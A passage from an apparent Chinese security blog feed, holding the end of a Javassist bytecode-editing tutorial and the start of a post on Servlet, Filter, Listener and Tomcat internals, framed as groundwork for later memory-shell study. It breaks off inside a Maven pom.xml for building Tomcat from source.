class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>赋值也可以这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>但这种赋值偏向于用构造器等进行初始化</p><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>方法可以设置的返回类型</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>这里不支持直接用String，是因为在java字节码中，参数和返回类型的String一般都是用常量池中字符串的索引值，要设置String类型的话就和前面一样用<strong>classPool.getCtClass(“java.lang.String”)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3 id="设置方法体"><a href="#设置方法体" class="headerlink" title="设置方法体"></a>设置方法体</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.设置方法体</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3 id="方法体前后插入代码"><a href="#方法体前后插入代码" class="headerlink" title="方法体前后插入代码"></a>方法体前后插入代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;我在前面插入:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;我在后面插入了:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2 id="添加构造器"><a href="#添加构造器" class="headerlink" title="添加构造器"></a>添加构造器</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//分别是参数列表，要添加的CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//设置name=var1，也就是第一个参数</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>无参构造去掉中间的参数即可</p></blockquote><h2 id="修改已有类"><a href="#修改已有类" class="headerlink" title="修改已有类"></a>修改已有类</h2><p>用ClassPool获取CtClass之后进行修改，我们对我们我们前面创建的Hello.class进行修改</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//对已有类进行修改</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>可以看到成功修改</p><blockquote><p>这里添加类路径的时候要注意在包名的上一层，不然会找不到类，因为get的时候用完整包名会自动添加上路径进行搜索</p><p>比如上面的添加路径为：D:\CTF\Java\JavaCode\JavassistLearn，搜索时就是这样：D:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1 id="一些特殊变量"><a href="#一些特殊变量" class="headerlink" title="一些特殊变量"></a>一些特殊变量</h1><p>就是我们前面使用的$1，$0那些</p><table><thead><tr><th>标识符</th><th>作用</th></tr></thead><tbody><tr><td>$0、$1、$2、 $3等</td><td>this和方法参数（1-N是方法参数的顺序）</td></tr><tr><td>$args</td><td>方法参数数组，类型为Object[]</td></tr><tr><td>$$</td><td>所有方法参数，例如：m($$)相当于m($1,$2,…)</td></tr><tr><td>$cflow(…)</td><td>control flow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，在强制转换表达式中使用。</td></tr><tr><td>$w</td><td>包装器类型，在强制转换表达式中使用。</td></tr><tr><td>$_</td><td>方法的返回值</td></tr><tr><td>$sig</td><td>类型为java.lang.Class的参数类型对象数组</td></tr><tr><td>$type</td><td>类型为java.lang.Class的返回值类型</td></tr><tr><td>$class</td><td>类型为java.lang.Class的正在修改的类</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>内存马前置学习</title>
    <link href="https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:05:36.000Z</published>
    <updated>2024-09-22T12:55:02.034Z</updated>
    
    <content type="html"><![CDATA[<p>学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener</p><p>参考文章：<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1 id="servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="servlet是什么"><a href="#Servlet是什么" class="headerlink" title="Servlet是什么"></a>Servlet是什么</h2><p>Servlet是JavaEE规范（接口）之一；<br>Servlet是运行在服务器(Web容器Tomcat等)上的一个 java 小程序，它用来接收客户端发送过来的请求进行处理，并响应数据给客户端。<br>Servlet及相对的对象，都由Tomcat创建，我们只是使用。</p><blockquote><p>Tomcat就是一个servlet容器</p></blockquote><p>Servlet需要完成3个任务：</p><ol><li>接收请求：将客户端发送过来的请求封装成ServletRequest对象（包含请求头、参数等各种信息）</li><li>处理请求：在service方法中接收参数，并且进行处理请求。</li><li>数据响应：请求处理完成后，通过转发（forward）或者重定向（redirect）到某个页面。</li></ol><p><strong>Servlet程序实现</strong></p><ol><li>实现Servlet接口，重新service方法</li><li>在web.xml或者用注解配置映射</li></ol><h2 id="servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><ol><li>执行 Servlet 构造器方法<br>第一步，在web.xml中的servlet中配置 load-on-startup 的值 ≥ 0 时，表示应用启动时就创建这个servlet。否则，第一次访问的时候调用。</li><li>执行 init 初始化方法<br>第二步，第一次访问的时候调用。</li><li>执行 service 方法<br>第三步，每次访问都会调用。</li><li>执行 destroy 销毁方法<br>第四步，在 web 工程停止的时候调用。</li></ol><h2 id="servletconfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h2><p>它是Servlet程序的配置信息类</p><p><strong>它的三大作用：</strong></p><ol><li>获取web.xml 中 Servlet 程序的别名 servlet-name 的值</li><li>获取web.xml 中 Servlet 程序的获取初始化参数 init-param</li><li>获取 ServletContext 对象</li></ol><p><strong>ServletConfig</strong></p><ol><li>每个web项目只有一个ServletContext对象，在web工程部署启动的时候创建，在工程停止的时候关闭。</li><li>ServletContext 对象是一个域对象（可以像Map一样存储数据的对象。域指的是作用域，这里是整个web工程）。</li></ol><p><strong>ServletContext 类的四个作用：</strong></p><ol><li>获取 web.xml 中配置的上下文参数 context-param</li><li>getContextPath()获取当前的工程路径，格式: &#x2F;工程路径</li><li>getRealPath()获取工程部署后在服务器硬盘上的绝对路径</li><li>像 Map 一样存取数据</li></ol><p><strong>HttpServletRequest和HttpServletResponse</strong></p><p>HttpServletResponse继承了ServletRequest，HttpServletResponse继承了ServletResponse，他们两个都是接口，所以我们在doGet或者doPost的时候传入的肯定是他们的实现类，而这个实现类是由tomcat创建的，封装了请求和响应的信息，到下面讲tomcat的时候再串起来细说。</p><h1 id="filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter 是JavaEE规范（接口）之一；<br>Filter 过滤器它的作用是：拦截请求，过滤响应。</p><p><strong>常见应用场景：</strong><br>1、权限检查<br>2、日记操作<br>3、事务管理<br>……等等</p><p>所以Filter的顺序是在处理请求之前进行</p><p><strong>Filter使用</strong></p><p>1、实现 Filter 接口，实现过滤方法 doFilter()<br>2、到 web.xml或者注解中去配置 Filter 的拦截路径</p><h2 id="filter生命周期"><a href="#Filter生命周期" class="headerlink" title="Filter生命周期"></a>Filter生命周期</h2><ol><li>构造器方法</li><li>init 初始化方法<br>第 1，2 步，在 web 工程启动的时候执行（Filter 已经创建）</li><li>doFilter 过滤方法<br>第 3 步，每次拦截到请求，就会执行</li><li>destroy 销毁<br>第 4 步，停止 web 工程的时候，就会执行（停止 web 工程，也会销毁 Filter 过滤器）</li></ol><h2 id="filterconfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h2><p>Tomcat 每次创建 Filter 的时候，也会同时创建一个 FilterConfig 类，这里包含了 Filter 配置文件的配置信息。</p><p><strong>FilterConfig 类的作用是获取 filter 过滤器的配置内容：</strong></p><ol><li>获取 Filter 的名称 filter-name 的内容</li><li>获取在 Filter 中配置的 init-param 初始化参数</li><li>获取 ServletContext 对象</li></ol><h2 id="filterchain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>就是过滤器链，过滤器可能存在不止一个，它们执行的优先顺序由它们在web.xml中从上到下配置的<strong>filter-mapping</strong>顺序决定，与filter的配置顺序无关</p><p><strong>特点</strong></p><ol><li>所有filter和目标资源默认都执行在一个线程中。</li><li>多个filter共同执行的时候，它们使用的是同一个Request对象。</li></ol><p><strong>拦截路径匹配规则</strong></p><ul><li>精确匹配 &#x2F;target.jsp</li><li>目录匹配 &#x2F;admin&#x2F;*</li><li>后缀名匹配 *.html</li></ul><blockquote><p>Filter只关心路径是否匹配，不关心资源是否存在，毕竟最终不是由它来处理</p></blockquote><h1 id="listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象，当被监视的对象发生情况时，立即采取相应的行动。本质是<strong>观察者模式</strong>。</p><p><strong>Servlet监听器</strong>：Servlet规范中定义的一种特殊类，它用于监听Web应用程序中的ServletContext，HttpSession 和HttpServletRequest等域对象的创建与销毁事件，以及监听这些域对象中的属性发生修改的事件。</p><h2 id="三类监听器"><a href="#三类监听器" class="headerlink" title="三类监听器"></a>三类监听器</h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>域对象监听器</li><li>域对象的属性域监听器</li><li>Session域中数据的监听器</li></ul><h2 id="八大监听器"><a href="#八大监听器" class="headerlink" title="八大监听器"></a>八大监听器</h2><ol><li><p>ServletContextListener<br>监听ServletContext对象的创建与销毁</p><p>在SpringMVC中，有个<strong>ContextLoaderListener</strong>，这个监听器就实现了ServletContextListener接口，表示对ServletContext对象本身的生命周期进行监控</p></li><li><p>HttpSessionListener</p><p>监听HttpSession对象的创建与销毁</p></li><li><p>ServletRequestListener</p><p>监听ServletRequest对象的创建与销毁</p></li><li><p>ServletContextAttributeListener</p><p>监听ServletContext中属性的创建、修改和销毁</p></li><li><p>HttpSessionAttributeListener</p><p>监听HttpSession中属性的创建、修改和销毁</p></li><li><p>ServletRequestAttributeListener</p><p>监听ServletRequest中属性的创建、修改和销毁</p></li><li><p>HttpSessionBindingListener</p><p>监听某个对象在Session域中的创建与移除</p></li><li><p>HttpSessionActivationListener</p><p>监听某个对象在Session中的序列化与反序列化。</p></li></ol><h2 id="监听器使用"><a href="#监听器使用" class="headerlink" title="监听器使用"></a>监听器使用</h2><ol><li><p>实现八大监听器中的一种，重写对应方法</p></li><li><p>同样去web.xml或者用注解配置</p><p>web.xml配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>推荐一个视频讲得非常好(我个人觉得)，把很多东西串起来了而且深入到源码层面，理解得更加清晰</p><p>视频链接：<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">【图灵学院】终于有人把tomcat讲清楚了！Tomcat底层原理深度解析_哔哩哔哩_bilibili</a></p><p><strong>Tomcat简单架构图</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><p>找到的另一张架构图</p><p><img src="https://cdn.clown2024.cn/202409142315429.png" alt="image-20240914231538327"></p><h2 id="tomcat源码启动"><a href="#Tomcat源码启动" class="headerlink" title="Tomcat源码启动"></a>Tomcat源码启动</h2><p>这里就搞了我好久了，看了很多文章才搞定，最后参考的是下面两篇文章</p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">记一次tomcat源码启动控制台中文乱码问题调试过程_org.apache.catalina.startup.versionloggerlistener.-CSDN博客</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">idea调试tomcat源码 - huim - 博客园 (cnblogs.com)</a></p><p><strong>源码下载</strong></p><p>首先找到源码包下载，这里用的tomcat-8.5.50的版本</p><p>历史版本列表：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>源码文件夹：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>然后在源码根目录下添加如下pom.xml文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span 